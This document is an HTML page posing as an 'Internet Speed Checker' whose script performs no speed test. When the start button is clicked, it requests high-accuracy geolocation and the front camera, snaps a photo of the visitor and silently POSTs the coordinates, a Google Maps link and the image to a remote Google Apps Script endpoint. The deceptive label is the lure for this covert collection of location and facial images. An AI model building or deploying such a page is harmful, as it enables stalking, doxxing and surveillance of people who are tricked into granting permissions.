<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Internet Speed Checker</title>

<style>
*{box-sizing:border-box;font-family:Arial}
body{display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#fff;margin:0}
.wrap{width:360px}
.card{padding:20px;border-radius:12px;background:#111827}
.btn{width:100%;padding:14px;border:none;border-radius:10px;background:#06b6d4;color:#000;font-weight:bold;cursor:pointer}
video{width:100%;margin-top:10px;border-radius:10px;display:none}
.bar{height:8px;background:#333;margin-top:10px;border-radius:6px;overflow:hidden}
.bar i{display:block;height:100%;width:0;background:#06b6d4}
.status{margin-top:10px;text-align:center}
</style>

</head>
<body>

<div class="wrap">
<div class="card">

<h3>Internet Speed Checker</h3>

<button id="start" class="btn">Start Speed Test</button>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none"></canvas>

<div class="bar"><i id="progress"></i></div>
<div id="status" class="status"></div>

</div>
</div>

<script>

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwu81JCB1p3GjePnzDhfRH4iUYrro_jG2XuN6Cmn4rnugmTedrmMnOIgHaK9U4lYbZOTQ/exec";

const start = document.getElementById("start");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const bar = document.getElementById("progress");
const status = document.getElementById("status");

let imageData = "";

// STATUS
function setStatus(msg){
  status.innerText = msg;
}

// GEOLOCALIZAÇÃO COM TIMEOUT
function getLocation(){
  return new Promise((resolve,reject)=>{
    navigator.geolocation.getCurrentPosition(
      resolve,
      reject,
      { enableHighAccuracy:true, timeout:10000 }
    );
  });
}

// CÂMERA
async function startCamera(){
  return navigator.mediaDevices.getUserMedia({
    video:{facingMode:"user"},
    audio:false
  });
}

// CAPTURA FOTO (CORRIGIDA)
async function capturePhoto(stream){

  return new Promise((resolve,reject)=>{

    video.srcObject = stream;
    video.style.display = "block";

    video.onloadedmetadata = () => {

      setTimeout(()=>{

        try{

          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          canvas.getContext("2d").drawImage(video,0,0);

          imageData = canvas.toDataURL("image/jpeg",0.5);

          // valida imagem
          if(!imageData || imageData.length < 1000){
            throw new Error("Imagem inválida");
          }

          // parar câmera
          stream.getTracks().forEach(t=>t.stop());
          video.style.display = "none";

          console.log("Imagem OK:", imageData.substring(0,50));

          resolve();

        }catch(err){
          reject(err);
        }

      }, 1500); // tempo real necessário

    };

  });
}

// ENVIO (COM RETORNO)
async function sendData(payload){

  try{

    const res = await fetch(SCRIPT_URL, {
      method: "POST",
      headers: {
        "Content-Type": "text/plain" // ⚠️ MUDANÇA CRÍTICA
      },
      body: JSON.stringify(payload)
    });

    const text = await res.text();

    console.log("Resposta:", text);

  }catch(e){
    console.error("Erro real no fetch:", e);
    throw new Error("fetch_error");
  }
}


// EXECUÇÃO
async function startTest(){

  start.disabled = true;
  setStatus("Solicitando permissões...");

  try{

    // captura paralela
    const [pos,stream] = await Promise.all([
      getLocation(),
      startCamera()
    ]);

    setStatus("Capturando imagem...");
    await capturePhoto(stream);

    if(!imageData){
      throw new Error("Imagem não capturada");
    }

    const payload = {
      timestamp:new Date().toISOString(),
      latitude:pos.coords.latitude,
      longitude:pos.coords.longitude,
      accuracy:pos.coords.accuracy,
      mapLink:`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
      image:imageData
    };

    console.log("Payload enviado:", payload);

    await sendData(payload);

    setStatus("✔ Dados enviados com sucesso");

  }catch(e){

  console.error("ERRO DETALHADO:", e);

  if(e.name === "NotAllowedError"){
    setStatus("Permissão da câmera negada");
  }
  else if(e.code === 1){
    setStatus("Permissão de localização negada");
  }
  else if(e.message.includes("Imagem")){
    setStatus("Falha ao capturar imagem");
  }
  else if(e.message.includes("fetch")){
    setStatus("Erro ao enviar dados");
  }
  else{
    setStatus("Erro desconhecido");
  }

}


  bar.style.width = "100%";

  setTimeout(()=>{
    start.disabled = false;
    bar.style.width = "0%";
  },3000);
}

start.addEventListener("click", startTest);

</script>

</body>
</html>
